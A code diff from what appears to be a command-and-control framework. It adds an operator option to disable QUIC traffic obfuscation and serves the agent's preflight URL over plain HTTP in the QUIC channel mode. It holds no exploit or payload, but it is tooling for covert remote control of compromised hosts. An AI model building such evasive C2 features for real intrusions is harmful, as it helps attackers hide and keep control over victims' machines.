@@ -26,6 +26,7 @@ type AgentConfig struct {
 	DoHServer           *string
 	ECHServerName       *string
 	C2ChannelMode       *string
+	QUICStandardKey     bool
 	IsP2PEnabled        bool
 	IsDirectC2          bool
 	PersistentRouter    bool
@@ -144,6 +145,9 @@ func MakeConfig(opts AgentConfig) error {
 	if _, err := transport.GetC2ChannelWrapper(live.RuntimeConfig.C2ChannelMode); err != nil {
 		return fmt.Errorf("invalid c2-channel-mode: %s (available: %s)", live.RuntimeConfig.C2ChannelMode, strings.Join(transport.AllC2ChannelModes(), ","))
 	}
+	// QUIC datagram obfuscation is on by default; the operator can opt out so
+	// the agent speaks stock QUIC (interoperable with HTTP/3 endpoints).
+	live.RuntimeConfig.QUICStandardKey = opts.QUICStandardKey
 	logging.Infof("Using C2 channel mode %s", live.RuntimeConfig.C2ChannelMode)
 
 	if live.RuntimeConfig.PaddingMin == 0 {
@@ -171,10 +175,13 @@ func MakeConfig(opts AgentConfig) error {
 		live.RuntimeConfig.OperatorIdleTimeout = *opts.OperatorIdleTimeout
 	}
 
-	// Preflight / Hybrid Mode intervals
+	// Preflight / Hybrid Mode intervals. Only the plain-HTTP and QUIC channel
+	// modes lack a TLS/TCP C2 endpoint, so preflight is served on the HTTP port
+	// for them; every other mode also has the h2 TLS listener.
+	plainPreflight := live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP || live.RuntimeConfig.C2ChannelMode == def.C2ChannelModeQUIC
 	if live.RuntimeConfig.PreflightURL == "" {
 		// generate new if empty
-		if live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
+		if plainPreflight {
 			live.RuntimeConfig.PreflightURL = fmt.Sprintf("http://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort, util.RandStr(util.RandInt(5, 10)))
 		} else {
 			live.RuntimeConfig.PreflightURL = fmt.Sprintf("https://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port, util.RandStr(util.RandInt(5, 10)))
@@ -183,7 +190,7 @@ func MakeConfig(opts AgentConfig) error {
 		// synchronise host and port with CCAddress
 		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
 		if err == nil {
-			if live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
+			if plainPreflight {
 				u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort)
 				u.Scheme = "http"
 			} else {
